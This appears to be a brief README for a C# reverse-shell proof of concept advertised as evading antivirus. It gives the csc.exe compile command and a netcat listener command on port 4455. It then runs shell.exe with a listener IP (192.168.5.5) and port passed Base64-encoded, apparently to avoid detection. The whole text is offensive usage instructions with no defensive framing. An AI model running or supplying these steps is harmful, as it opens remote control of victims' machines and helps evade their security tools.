# C# Reverse Shell AV Evasion POC
##Compile:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs

##Start the listener:
nc -nvlp 4455

##Execute the binary:
shell.exe MTkyLjE2OC41LjU= NDQ1NQ==

Base64 encoded listener IP – 192.168.5.5
Base64 encode listening port – 4455
